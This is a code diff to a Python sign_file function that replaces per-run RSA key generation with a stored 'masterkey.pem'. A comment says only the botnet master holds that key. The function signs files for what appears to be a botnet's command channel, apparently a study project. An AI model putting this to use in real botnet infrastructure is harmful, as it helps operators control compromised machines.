@@ -12,21 +12,14 @@ def sign_file(f):
   # - Need a nonce for freshness ***
   # - Should we harcode the key or re-generate a new one each time the master runs this py file? **** 
 
-  # Generate the private/public key pair using the RSA module
-  key = RSA.generate(4096) 
-  pri_key_file = open('privkey.der', 'wb')
-  pri_key_file.write(key.exportKey('DER'))
-  pri_key_file.close()
-  
-  pub_key = key.publickey()
-  pub_key_file = open('pubKey.der', 'wb')
-  pub_key_file.write(pub_key.exportKey('DER'))
-  pub_key_file.close()
+  # Import the master key that only the botnet master has access too
+  masterkey = RSA.importKey(open('masterkey.pem', 'rb').read())
   
   # Create the hash that will be signed and pre-pended to message
   h = SHA256.new(f)
-  signer = PKCS1_v1_5.new(key)
+  signer = PKCS1_v1_5.new(masterkey)
   signature = signer.sign(h)
+  print(len(signature))
   
   return signature + f
 
